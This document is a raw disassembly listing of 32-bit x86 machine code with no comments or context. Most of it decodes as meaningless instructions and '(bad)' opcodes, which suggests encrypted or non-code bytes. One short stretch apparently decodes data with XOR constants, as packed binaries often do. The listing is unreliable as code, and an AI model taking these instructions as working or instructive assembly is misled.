  4074ee:	out    dx,al
  4074ef:	imul   edx,DWORD PTR [edi-0x5a],0xb9eb90e6
  4074f6:	push   eax
  4074f7:	and    al,0x67
  4074f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074fa:	xchg   ecx,eax
  4074fb:	push   cs
  4074fc:	imul   esp,DWORD PTR [ecx],0xc
  4074ff:	dec    ecx
  407500:	inc    esi
  407501:	daa    
  407502:	out    0x28,eax
  407504:	dec    esp
  407505:	add    BYTE PTR [ecx],0x74
  407508:	lods   al,BYTE PTR ds:[esi]
  407509:	jo     0x4074aa
  40750b:	cs xchg edx,eax
  40750d:	xchg   ebx,eax
  40750e:	sub    dl,BYTE PTR [esi-0x2a]
  407511:	imul   esi,DWORD PTR [ebx+0x26],0x96f515f2
  407518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407519:	mov    ecx,0x43a415cc
  40751e:	sti    
  40751f:	stc    
  407520:	iret   
  407521:	test   BYTE PTR [edi-0x6a0824c3],ch
  407527:	adc    al,0x1c
  407529:	outs   dx,DWORD PTR ds:[esi]
  40752a:	sbb    al,0xab
  40752c:	add    al,BYTE PTR [ebx]
  40752e:	test   eax,0x37a6a15c
  407533:	out    dx,al
  407534:	mov    eax,ds:0x265328d0
  407539:	jmp    FWORD PTR [eax]
  40753b:	rcr    DWORD PTR [edi+0xa],cl
  40753e:	inc    edi
  40753f:	aas    
  407540:	add    ebx,edx
  407542:	jo     0x407551
  407544:	pop    eax
  407545:	xchg   ebx,eax
  407546:	dec    edi
  407547:	int3   
  407548:	lock bound edx,QWORD PTR [eax+edi*4]
  40754c:	mov    esi,0x3d7f516
  407551:	fcmovnb st,st(2)
  407553:	dec    edi
  407554:	mov    ds:0xae54537e,al
  407559:	jmp    0xef27:0xf7143d0b
  407560:	and    bl,dh
  407562:	(bad)  
  407563:	rol    BYTE PTR [eax+0x45],cl
  407566:	in     al,dx
  407567:	xor    al,0xe4
  407569:	scas   eax,DWORD PTR es:[edi]
  40756a:	ja     0x407580
  40756c:	push   0x36
  40756e:	fild   DWORD PTR [ebp-0x7]
  407571:	xchg   ecx,eax
  407572:	push   ebp
  407573:	es cwde 
  407575:	pop    ss
  407576:	in     eax,0x96
  407578:	arpl   bx,ax
  40757a:	mov    esi,0x67498e8b
  40757f:	push   ds
  407580:	cs xchg esi,eax
  407582:	mov    esp,0x21c510df
  407587:	mov    ah,0xfd
  407589:	sub    al,0x9f
  40758b:	nop
  40758c:	pop    edx
  40758d:	aam    0x2f
  40758f:	fwait
  407590:	and    DWORD PTR [ebx-0x53f04bb3],ecx
  407596:	enter  0xc102,0xe9
  40759a:	add    ah,BYTE PTR [esi-0x75]
  40759d:	enter  0x458b,0xb0
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0x89
  407613:	popf   
  407614:	(bad)  
  407615:	mov    esi,0x18187d17
  40761a:	sahf   
  40761b:	adc    bl,BYTE PTR [eax]
  40761d:	sbb    BYTE PTR [ecx],al
  40761f:	dec    ebx
  407620:	mov    ch,0xf8
  407622:	jmp    0x4075e1
  407624:	sub    eax,0x8be37923
  407629:	(bad)  
  40762a:	mov    bl,BYTE PTR [edx-0x1a0be1df]
  407630:	pop    eax
  407631:	add    BYTE PTR [ebp+0xc28c091],al
  407637:	cdq    
  407638:	loope  0x4075d5
  40763a:	push   esi
  40763b:	mov    dl,BYTE PTR [edi]
  40763d:	call   FWORD PTR [ecx+0x78ee05fb]
  407643:	ins    DWORD PTR es:[edi],dx
  407644:	cli    
  407645:	lock mov ebx,DWORD PTR [edx+edx*2-0x244e5c75]
  40764d:	sbb    al,0x6a
  40764f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407650:	popf   
  407651:	jae    0x4075e8
  407653:	and    BYTE PTR [eax+edx*2-0x80],dh
  407657:	jae    0x4076c9
  407659:	je     0x4076aa
  40765b:	dec    edx
  40765c:	and    eax,0x8a0c98a5
  407661:	and    ebx,DWORD PTR [edi]
  407663:	jl     0x407666
  407665:	sbb    BYTE PTR [esi+ebp*4],ah
  407668:	out    0xd7,eax
  40766a:	sbb    bh,BYTE PTR [ebp+edx*2+0x76aab442]
  407671:	and    al,0xa9
  407673:	lds    esp,FWORD PTR [eax]
  407675:	pushf  
  407676:	push   esi
  407677:	sub    bl,dl
  407679:	dec    eax
  40767a:	int    0x78
  40767c:	sbb    DWORD PTR [edx+0x1a],edi
  40767f:	jge    0x4076ce
  407681:	ins    BYTE PTR es:[edi],dx
  407682:	in     al,dx
  407683:	jb     0x407672
  407685:	stos   BYTE PTR es:[edi],al
  407686:	mov    BYTE PTR [esi],dh
  407688:	mov    fs,WORD PTR [ebp-0x3457c57a]
  40768e:	xchg   edi,eax
  40768f:	clc    
  407690:	sar    BYTE PTR [eax],cl
  407692:	xchg   edx,eax
  407693:	push   esi
  407694:	push   es
  407695:	jge    0x4076bd
  407697:	push   cs
  407698:	cld    
  407699:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40769b:	lods   al,BYTE PTR ds:[esi]
  40769c:	mov    bl,0x40
  40769e:	repz cli 
  4076a0:	adc    ebp,ebp
  4076a2:	gs pop esi
  4076a4:	sbb    edx,DWORD PTR [eax-0x5c]
  4076a7:	jb     0x407671
  4076a9:	and    esp,ebx
  4076ab:	addr16 fdivrp st(2),st
  4076ae:	inc    edi
  4076af:	idiv   ah
  4076b1:	outs   dx,BYTE PTR ds:[esi]
  4076b2:	sub    cl,0x98
  4076b5:	push   ecx
  4076b6:	lods   eax,DWORD PTR ds:[esi]
  4076b7:	sbb    DWORD PTR [esi-0x70],ebp
  4076ba:	imul   ebp,DWORD PTR [edi],0xffffffaf
  4076bd:	pusha  
  4076be:	mov    al,ds:0xd06aa676
  4076c3:	jb     0x4076fe
  4076c5:	xchg   edx,eax
  4076c6:	jl     0x407672
  4076c8:	cdq    
  4076c9:	or     BYTE PTR [ebx],0x10
  4076cc:	inc    esp
  4076cd:	pop    ds
  4076ce:	data16 fwait
  4076d0:	xchg   ebp,edx
  4076d2:	cmp    eax,0x67ffe843
  4076d7:	and    eax,0xc7a8eab1
  4076dc:	call   FWORD PTR [eax-0xb8be4ca]
  4076e2:	push   ss
  4076e3:	sbb    ah,BYTE PTR [ebp+ecx*1-0x50]
  4076e7:	dec    ecx
  4076e8:	jb     0x407745
  4076ea:	xor    DWORD PTR [ecx],ebp
  4076ec:	pusha  
  4076ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076ee:	cmp    edx,ebp
  4076f0:	rcr    DWORD PTR [esi-0x14474f2d],0x62
  4076f7:	(bad)  [edi+eiz*1-0x2c]
  4076fb:	jle    0x407721
  4076fd:	or     BYTE PTR [edx+0x5b768c16],al
  407703:	xchg   edi,eax
  407704:	scas   eax,DWORD PTR es:[edi]
  407705:	call   0x38c7:0xb117d425
  40770c:	or     cl,BYTE PTR [ebx+0x2e3c42de]
  407712:	out    dx,al
  407713:	mov    WORD PTR [ebx-0x1db41acb],?
  407719:	ds fwait
  40771b:	lock dec esi
  40771d:	cmp    BYTE PTR [eax+0x5f2078b2],0xc9
  407724:	mov    edx,0xe2106c1f
  407729:	jno    0x4076d6
  40772b:	pop    esp
  40772c:	test   eax,0x7d4b5685
  407731:	js     0x4076e3
  407733:	pcmpgtb mm5,mm0
  407736:	imul   ebx,DWORD PTR [edx-0x4a],0x75
  40773a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40773b:	retf   
  40773c:	pop    ebp
  40773d:	fs push edx
  40773f:	cld    
  407740:	add    BYTE PTR [edx],dh
  407742:	mov    ah,0x13
  407744:	ret    0x5675
  407747:	inc    ebx
  407748:	sub    bl,BYTE PTR [ebp-0x33]
  40774b:	push   es
  40774c:	adc    cl,BYTE PTR [ebx-0x4ba33a88]
  407752:	inc    ebp
  407753:	sbb    DWORD PTR [edx],ecx
  407755:	or     ebp,eax
  407757:	outs   dx,BYTE PTR ds:[esi]
  407758:	or     al,0xce
  40775a:	xlat   BYTE PTR ds:[ebx]
  40775b:	sti    
  40775c:	xchg   ecx,eax
  40775d:	dec    ecx
  40775e:	ss stc 
  407760:	in     al,0xd5
  407762:	ret    
  407763:	pop    ecx
  407764:	cwde   
  407765:	inc    esi
  407766:	sbb    eax,0xb14cb720
  40776b:	jns    0x40770e
  40776d:	xchg   edi,eax
  40776e:	cmp    eax,0x5b20cce9
  407773:	iret   
  407774:	sub    cl,BYTE PTR [esi]
  407776:	dec    edx
  407777:	into   
  407778:	sub    DWORD PTR [ebx],ebx
  40777a:	pop    esi
  40777b:	xchg   ebx,eax
  40777c:	addr16 popa 
  40777e:	sbb    ch,BYTE PTR [edx-0x5]
  407781:	xor    DWORD PTR [esi-0x2f9f15d0],esp
  407787:	lahf   
  407788:	or     ch,bh
  40778a:	adc    bh,ch
  40778c:	mov    ecx,0xa477dcfd
  407791:	add    al,0x16
  407793:	psubusw mm5,QWORD PTR [ebx]
  407796:	nop
  407797:	sub    ebp,DWORD PTR [eax-0x31]
  40779a:	cld    
  40779b:	jns    0x40772b
  40779d:	add    esi,DWORD PTR [ebp-0x59]
  4077a0:	add    eax,0xd67043ee
  4077a5:	add    eax,0xf154cc31
  4077aa:	or     al,0x9f
  4077ac:	add    DWORD PTR [ebx],edx
  4077ae:	cmc    
  4077af:	push   ebp
  4077b0:	jge    0x4077a7
  4077b2:	push   edi
  4077b3:	mov    WORD PTR [ebx-0x4e48598c],es
  4077b9:	icebp  
  4077ba:	jnp    0x4077a3
  4077bc:	imul   esi,DWORD PTR [esp+eiz*8-0x7aa8e7f],0xffffff8b
  4077c4:	pushf  
  4077c5:	ficom  WORD PTR [ebx+0x12]
  4077c8:	dec    edi
  4077c9:	push   esi
  4077ca:	adc    al,0xca
  4077cc:	add    al,BYTE PTR [eax]
  4077ce:	popa   
  4077cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077d0:	adc    eax,0x6f1908e2
  4077d5:	inc    ax
  4077d7:	jle    0x4077a2
  4077d9:	pop    esp
  4077da:	push   0xffffffda
  4077dc:	sbb    ebp,ebp
  4077de:	sbb    al,0x45
  4077e0:	cmp    BYTE PTR [ebx],dh
  4077e2:	sahf   
  4077e3:	(bad)  
  4077e4:	xor    bh,BYTE PTR [esi]
  4077e6:	mov    bh,0x75
  4077e8:	push   ebx
  4077e9:	inc    eax
  4077ea:	sbb    al,0x1
  4077ec:	mov    bh,0x11
  4077ee:	inc    eax
  4077ef:	or     bl,cl
  4077f1:	jl     0x40777e
  4077f3:	ja     0x4077dc
  4077f5:	lock xor BYTE PTR [esi-0x6a],0xcb
  4077fa:	inc    esp
  4077fb:	push   ebx
  4077fc:	xchg   edi,eax
  4077fd:	pop    ecx
  4077fe:	cld    
  4077ff:	add    BYTE PTR ds:0x84535e04,ah
  407805:	fild   QWORD PTR [edi+eax*8]
  407808:	in     eax,0x2c
  40780a:	or     al,0xbd
  40780c:	data16 sti 
  40780e:	das    
  40780f:	fnstenv ss:[esi+0x7a448bf8]
  407816:	rcr    ebx,cl
  407818:	sbb    bh,ch
  40781a:	jmp    0x80a1a63b
  40781f:	pop    ds
  407820:	int    0x71
  407822:	enter  0x87ae,0x52
  407826:	push   edi
  407827:	lods   eax,DWORD PTR ds:[esi]
  407828:	mov    ds:0xacd6d7cc,al
  40782d:	and    edx,esi
  40782f:	in     al,dx
  407830:	jbe    0x4078b0
  407832:	jnp    0x4077b9
  407834:	fldl2t 
  407836:	mov    bh,0x51
  407838:	bound  ebp,QWORD PTR ds:0xe3120eac
  40783e:	or     dh,dh
  407840:	jbe    0x407895
  407842:	jns    0x40784d
  407844:	push   esi
  407845:	sbb    dl,bh
  407847:	les    esp,FWORD PTR [eax-0x2c]
  40784a:	lea    ebx,[edi+0x543343fd]
  407850:	xor    DWORD PTR [edi-0x64],eax
  407853:	inc    esi
  407854:	(bad)  
  407855:	ror    bh,1
  407857:	cld    
  407858:	mov    ds:0x69e74208,al
  40785d:	jmp    FWORD PTR [edx]
  40785f:	mov    dh,0xd9
  407861:	sar    DWORD PTR [esi],1
  407863:	ja     0x4078c4
  407865:	lds    edx,FWORD PTR [esi]
  407867:	push   0xffffff8d
  407869:	hlt    
  40786a:	bound  edx,QWORD PTR [edi-0x211d02e6]
  407870:	mov    esp,DWORD PTR [ecx]
  407872:	jmp    0xf49c:0x1e8c7564
  407879:	setbe  BYTE PTR [eax-0x65c167a6]
  407880:	xchg   esp,eax
  407881:	cmp    eax,DWORD PTR [esi+0x45fc5f2d]
  407887:	pop    eax
  407888:	cmp    cl,cl
  40788a:	paddd  mm6,QWORD PTR [edx-0x29]
  40788e:	push   esi
  40788f:	sub    al,0xa5
  407891:	xlat   BYTE PTR ds:[ebx]
  407892:	pop    ebp
  407893:	cmp    cl,0xb9
  407896:	mov    BYTE PTR [ecx],cl
  407898:	shr    DWORD PTR [esi+esi*4],1
  40789b:	ins    BYTE PTR es:[edi],dx
  40789c:	push   ebp
  40789d:	rcr    dh,0x5a
  4078a0:	stc    
  4078a1:	mov    ch,0x5
  4078a3:	out    dx,eax
  4078a4:	pop    eax
  4078a5:	add    bl,BYTE PTR [ebp-0xe]
  4078a8:	pushf  
  4078a9:	int    0x70
  4078ab:	pop    ds
  4078ac:	mov    bl,0x22
  4078ae:	test   edi,eax
  4078b0:	mov    ah,0x85
  4078b2:	mov    ecx,0x65940ffd
  4078b7:	sub    ax,0x115b
  4078bb:	mov    bl,0x5
  4078bd:	mov    ebx,0x71b8d563
  4078c2:	xchg   ebp,eax
  4078c3:	xor    DWORD PTR [edx-0x79],ecx
  4078c6:	es pop ebp
  4078c8:	pushf  
  4078c9:	enter  0x6372,0xbf
  4078cd:	jg     0x407901
  4078cf:	and    eax,0xa66f54c7
  4078d4:	jae    0x407920
  4078d6:	adc    ebx,DWORD PTR [eax-0x7b5701e0]
  4078dc:	adc    BYTE PTR [edx],dl
  4078de:	add    edi,ecx
  4078e0:	add    dh,BYTE PTR [edx-0x37]
  4078e3:	cli    
  4078e4:	pop    ebx
  4078e5:	xchg   esp,eax
  4078e6:	ror    BYTE PTR [eax],0xd
  4078e9:	in     al,dx
  4078ea:	push   ds
  4078eb:	xor    eax,0x1a00bed7
  4078f0:	pusha  
  4078f1:	xchg   ebx,eax
  4078f2:	jle    0x40794e
  4078f4:	leave  
  4078f5:	fild   QWORD PTR [esi+0x21]
  4078f8:	sub    BYTE PTR [edx],bh
  4078fa:	push   eax
  4078fb:	test   BYTE PTR [eax+0x3d],bh
  4078fe:	sub    al,0x1e
  407900:	call   0xc61d:0xc7138668
  407907:	out    0x7f,al
  407909:	icebp  
  40790a:	dec    ebx
  40790b:	retf   
  40790c:	shl    DWORD PTR [edi+0x37b132a1],1
  407912:	xchg   bl,cl
  407914:	(bad)  
  407915:	(bad)  
  407916:	stos   DWORD PTR es:[edi],eax
  407917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407918:	jle    0x407982
  40791a:	loope  0x407945
  40791c:	xchg   esi,eax
  40791d:	sti    
  40791e:	ds pushf 
  407920:	cs mov esi,0x7772173b
  407926:	out    dx,al
  407927:	or     al,0xb7
  407929:	(bad)  
  40792a:	sbb    ah,bl
  40792c:	fisttp WORD PTR [eax-0x1e2fe415]
  407932:	jp     0x407982
  407934:	xor    al,0xfe
  407936:	or     DWORD PTR [edx-0x23],ebp
  407939:	dec    edx
  40793a:	and    DWORD PTR [ebx-0x38e93638],ebp
  407940:	push   esp
  407941:	(bad)  
  407943:	fistp  DWORD PTR [ebp-0x1b]
  407946:	cdq    
  407947:	xchg   ecx,eax
  407948:	shl    BYTE PTR [ebp-0x80],cl
  40794b:	push   0x69468f62
  407950:	xchg   esp,eax
  407951:	das    
  407952:	daa    
  407953:	and    dh,BYTE PTR [edi]
  407955:	das    
  407956:	jg     0x40792e
  407958:	pushf  
  407959:	hlt    
  40795a:	jb     0x40799e
  40795c:	in     al,dx
  40795d:	mov    cl,BYTE PTR [ecx]
  40795f:	imul   esi,DWORD PTR [esp+ebx*1],0x1d
  407963:	and    eax,0x12690fd0
  407968:	popf   
  407969:	adc    dh,cl
  40796b:	repz jns 0x407941
  40796e:	fiadd  WORD PTR [bx+di+0x9]
  407972:	and    eax,0x83962941
  407977:	fcom   QWORD PTR [ecx]
  407979:	add    bh,ah
  40797b:	aam    0xa
  40797d:	mov    BYTE PTR [edi+0x2ec1a433],ch
  407983:	out    dx,eax
  407984:	mov    ch,0xc6
  407986:	cmp    esi,DWORD PTR [esi]
  407988:	pop    eax
  407989:	push   edi
  40798a:	es inc esi
  40798c:	pop    ebp
  40798d:	aaa    
  40798e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40798f:	push   0xffffffdc
  407991:	xchg   ebp,eax
  407992:	test   eax,0xeb33271f
  407997:	(bad)  
  407998:	xor    al,BYTE PTR [edx]
  40799a:	jae    0x40793a
  40799c:	xor    eax,0x7ba4ddbf
  4079a1:	xchg   esi,eax
  4079a2:	mov    WORD PTR ds:0x195c3101,fs
  4079a8:	xor    BYTE PTR [edi],bh
  4079aa:	mov    ds:0xac961fae,eax
  4079af:	xor    DWORD PTR [esi],0x135617dc
  4079b5:	(bad)  
  4079b7:	sahf   
  4079b8:	dec    edi
  4079b9:	(bad)  [esi+0x50]
  4079bc:	(bad)  
  4079bd:	scas   eax,DWORD PTR es:[edi]
  4079be:	or     ecx,DWORD PTR [esi]
  4079c0:	jmp    0xfdd12754
  4079c5:	pushf  
  4079c6:	mov    fs,WORD PTR ss:[edx]
  4079c9:	sbb    al,0x8c
  4079cb:	leave  
  4079cc:	ret    
  4079cd:	lock inc eax
  4079cf:	pop    esp
  4079d0:	call   0x347e:0x2f6536f5
  4079d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079d8:	push   ecx
  4079d9:	dec    edi
  4079da:	mov    DWORD PTR [esi-0x76edef79],edi
  4079e0:	inc    ebp
  4079e1:	int3   
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x407990
  4079f4:	mov    eax,0x759d7e0a
  4079f9:	sbb    BYTE PTR [eax],bl
  4079fb:	sahf   
  4079fc:	adc    bl,BYTE PTR [eax]
  4079fe:	sbb    BYTE PTR [edi+0x61],ch
  407a01:	jmp    0x872f44ff
  407a06:	out    dx,al
  407a07:	fdiv   QWORD PTR [edx]
  407a09:	mov    edx,0x6ab8df7b
  407a0e:	push   esi
  407a0f:	popf   
  407a10:	cmp    BYTE PTR [edi+ebx*4],al
  407a13:	ret    
  407a14:	or     bh,BYTE PTR [ecx+0x429c7dd1]
  407a1a:	fld    DWORD PTR [esi-0x14]
  407a1d:	icebp  
  407a1e:	cmp    al,0xb6
  407a20:	mov    ebx,esp
  407a22:	enter  0x133c,0x44
  407a26:	in     eax,0x1a
  407a28:	je     0x407a1d
  407a2a:	push   ds
  407a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a2c:	nop
  407a2d:	inc    ecx
  407a2e:	loop   0x4079ff
  407a30:	in     al,dx
  407a31:	lahf   
  407a32:	push   ss
  407a33:	cmp    eax,0x60f82012
  407a38:	jl     0x407ab4
  407a3a:	fadd   st,st(7)
  407a3c:	in     eax,0x9
  407a3e:	sbb    DWORD PTR [ebp+0x77e177fb],ebp
  407a44:	inc    edi
  407a45:	pop    ebx
  407a46:	cmp    eax,0x112071c5
  407a4b:	iret   
  407a4c:	mov    edi,0x35b1c070
  407a51:	cdq    
  407a52:	cld    
  407a53:	jo     0x407ad4
  407a55:	cmp    al,0x84
  407a57:	imul   ebx,DWORD PTR [bx],0xffffffbb
  407a5b:	mov    esp,0xf13fe08c
  407a60:	sbb    DWORD PTR [esi],esi
  407a62:	adc    eax,0x73a916e6
  407a67:	bound  edx,QWORD PTR [esi-0x731c5a]
  407a6d:	fdivr  st(7),st
  407a6f:	adc    BYTE PTR ss:[edi+0x77],0x87
  407a74:	or     DWORD PTR [ecx-0x52],0xffffffdd
  407a78:	and    edi,eax
  407a7a:	imul   ebp,DWORD PTR [eax-0x11e72eef],0xffffffa1
  407a81:	sbb    al,0x49
  407a83:	ret    
  407a84:	test   al,0x83
  407a86:	in     eax,0xd2
  407a88:	and    al,0xb9
  407a8a:	sub    eax,0x72c70273
  407a8f:	mov    ecx,0x3ec7de8e
  407a94:	fwait
  407a95:	and    eax,DWORD PTR [edi+0x37]
  407a98:	xchg   edi,eax
  407a99:	fwait
  407a9a:	test   eax,0x41439fdc
  407a9f:	repnz jmp 0xee3b:0x6617cf6f
  407aa7:	inc    ecx
  407aa8:	pop    ds
  407aa9:	jmp    0x407b00
  407aab:	hlt    
  407aac:	sub    al,0x28
  407aae:	mov    esi,0xede1fda4
  407ab3:	jl     0x407aa4
  407ab5:	in     al,0x9f
  407ab7:	mov    al,0x97
  407ab9:	sbb    DWORD PTR [ebx],ebp
  407abb:	xor    ecx,DWORD PTR [edi-0x5d98ae0e]
  407ac1:	stos   BYTE PTR es:[edi],al
  407ac2:	out    0x9e,eax
  407ac4:	sahf   
  407ac5:	iret   
  407ac6:	inc    ebp
  407ac7:	sbb    bh,BYTE PTR [ebp-0x4d]
  407aca:	xor    eax,0x5e412aa7
  407acf:	mov    dl,0x39
  407ad1:	fcom   DWORD PTR [edx]
  407ad3:	scas   eax,DWORD PTR es:[edi]
  407ad4:	mov    eax,ds:0xb1798905
  407ad9:	inc    esp
  407ada:	sbb    BYTE PTR [ebx-0x22],0x9e
  407ade:	fnstcw WORD PTR ds:0x3f57b54b
  407ae4:	push   esi
  407ae5:	mov    dh,0x6b
  407ae7:	xor    BYTE PTR [ebp-0x440b354a],ch
  407aed:	inc    ebp
  407aef:	dec    eax
  407af0:	and    eax,0x44d86c1f
  407af5:	in     eax,dx
  407af6:	cdq    
  407af7:	and    DWORD PTR [ebx],eax
  407af9:	scas   eax,DWORD PTR es:[edi]
  407afa:	cmp    eax,DWORD PTR [edi+ebp*4-0x739028a0]
  407b01:	aad    0x3a
  407b03:	mov    dl,ch
  407b05:	ja     0x407b75
  407b07:	hlt    
  407b08:	or     dl,BYTE PTR [ecx+0x4396e78]
  407b0e:	cmp    DWORD PTR [edi+0x78dc075b],esp
  407b14:	mov    ds:0x544e4beb,eax
  407b19:	in     eax,0x6c
  407b1b:	shl    ebp,cl
  407b1d:	scas   eax,DWORD PTR es:[edi]
  407b1e:	mov    cs,ebp
  407b20:	xchg   esi,eax
  407b21:	add    al,BYTE PTR [eax]
  407b23:	pop    ss
  407b24:	mov    bl,0x63
  407b26:	xchg   esp,eax
  407b27:	xchg   ebp,eax
  407b28:	jge    0x407b69
  407b2a:	add    eax,0x473a487b
  407b2f:	xlat   BYTE PTR ds:[ebx]
  407b30:	push   ebp
  407b31:	cli    
  407b32:	pop    ds
  407b33:	xchg   ecx,eax
  407b34:	or     BYTE PTR [eax-0x202b7aa1],0x96
  407b3b:	aad    0x4d
  407b3d:	jmp    0x6b2a:0x27eeda61
  407b44:	adc    al,0xd8
  407b47:	stc    
  407b48:	loopne 0x407b10
  407b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b4b:	jmp    0x5fd464bb
  407b50:	pusha  
  407b51:	cmp    dh,BYTE PTR [ebx]
  407b53:	adc    al,0xf5
  407b55:	sbb    DWORD PTR [esi],ecx
  407b57:	jb     0x407b98
  407b59:	push   es
  407b5a:	sub    al,BYTE PTR [eax-0x2e]
  407b5d:	loopne 0x407b1e
  407b5f:	cwde   
  407b60:	fsubr  st(3),st
  407b62:	ins    DWORD PTR es:[edi],dx
  407b63:	enter  0xed91,0x2e
  407b67:	xchg   esi,eax
  407b68:	das    
  407b69:	mov    ebx,esp
  407b6b:	popf   
  407b6c:	or     edi,DWORD PTR [eax+0x3f391dee]
  407b72:	lods   eax,DWORD PTR ds:[esi]
  407b73:	mov    eax,ds:0xb0387d70
  407b78:	sbb    eax,0xc321475d
  407b7d:	xor    eax,DWORD PTR [ecx+0x47]
  407b80:	(bad)  
  407b81:	mov    ebx,0xf91eaab1
  407b86:	in     eax,dx
  407b87:	les    edi,FWORD PTR [esi+0x1f]
  407b8a:	sbb    cl,0x4e
  407b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b8e:	inc    edi
  407b8f:	or     al,0xc1
  407b91:	dec    edi
  407b92:	cwde   
  407b93:	mov    ebx,0x8fc0f77d
  407b98:	sub    eax,0x93d7cd06
  407b9d:	mov    eax,0xea75e53f
  407ba2:	mov    cl,0xd7
  407ba4:	xchg   esi,eax
  407ba5:	loop   0x407b4c
  407ba7:	pop    eax
  407ba8:	in     eax,0x64
  407baa:	outs   dx,BYTE PTR ds:[esi]
  407bab:	inc    esp
  407bac:	adc    BYTE PTR [ecx-0x1fa1bc02],bh
  407bb2:	mov    ebx,0x459acf0
  407bb7:	leave  
  407bb8:	mov    edx,0x1372ea52
  407bbd:	jmp    0x6ef3:0xd5c0222e
  407bc4:	inc    esi
  407bc5:	je     0x407bf9
  407bc7:	add    DWORD PTR [eax+ebx*8],esp
  407bca:	jl     0x407bcd
  407bcc:	retf   
  407bcd:	into   
  407bce:	call   0xe0bd:0xcb2e5642
  407bd5:	mov    ds:0x343b66d6,al
  407bda:	lea    esp,[edi+0x3]
  407bdd:	push   edi
  407bde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bdf:	and    BYTE PTR [esp+ebx*1+0x7d8f424f],cl
  407be6:	lds    ebx,FWORD PTR [ebx+0x7751733f]
  407bec:	push   ebx
  407bed:	push   ebx
  407bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bef:	shr    DWORD PTR [edi],0xe2
  407bf2:	or     edi,DWORD PTR [edx+0x5d]
  407bf5:	(bad)  
  407bf6:	aam    0x9a
  407bf8:	stc    
  407bf9:	jne    0x407bd9
  407bfb:	out    dx,eax
  407bfc:	lahf   
  407bfd:	gs nop
  407bff:	jo     0x407c4e
  407c01:	dec    edi
  407c02:	add    DWORD PTR [esi],ebp
  407c04:	jecxz  0x407c6c
  407c06:	and    ebx,0xb05e0a8f
  407c0c:	ret    
  407c0d:	mov    esp,0x1aad5978
  407c12:	push   ebx
  407c13:	repz xchg esp,eax
  407c15:	add    eax,0x485c7fa
  407c1a:	adc    al,0xea
  407c1c:	add    eax,0xd3be820b
  407c21:	loop   0x407c73
  407c23:	(bad)  
  407c25:	inc    esi
  407c26:	in     eax,0x1f
  407c28:	push   ecx
  407c29:	(bad)  
  407c2a:	shr    DWORD PTR [ecx-0x4f],cl
  407c2d:	add    DWORD PTR [esi+ecx*4-0x206bd70d],0xb4cb71ff
  407c38:	js     0x407c6c
  407c3a:	lock lea eax,[ebx-0x3d472d1b]
  407c41:	add    BYTE PTR [esi-0x60ba9fc9],ch
  407c47:	sbb    BYTE PTR [ecx],ch
  407c49:	rol    BYTE PTR [edx-0x4b1516e1],cl
  407c4f:	mov    bh,BYTE PTR [ebp-0x77]
  407c52:	out    dx,al
  407c53:	sub    dl,BYTE PTR [ebx-0x79a4bd5a]
  407c59:	xchg   ecx,eax
  407c5a:	pop    ebx
  407c5b:	and    al,0xec
  407c5d:	jge    0x407c67
  407c5f:	in     al,dx
  407c60:	and    BYTE PTR [eax],dl
  407c62:	inc    edi
  407c63:	adc    ch,bh
  407c65:	icebp  
  407c66:	adc    eax,DWORD PTR fs:[ebp+0x7100b739]
  407c6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c6e:	mov    eax,ds:0x1175d4c0
  407c73:	test   DWORD PTR [ebp-0x169fff43],esi
  407c79:	shr    DWORD PTR [esi],0x8b
  407c7c:	jecxz  0x407cf6
  407c7e:	xchg   ebx,eax
  407c7f:	or     DWORD PTR [edx-0x49b8a31e],0xffffff98
  407c86:	push   0x2a
  407c88:	nop
  407c89:	and    DWORD PTR [eax+0x33],eax
  407c8c:	push   ecx
  407c8d:	iret   
  407c8e:	scas   al,BYTE PTR es:[edi]
  407c8f:	shl    BYTE PTR [ebp+0x6],cl
  407c92:	out    0xc3,al
  407c94:	cdq    
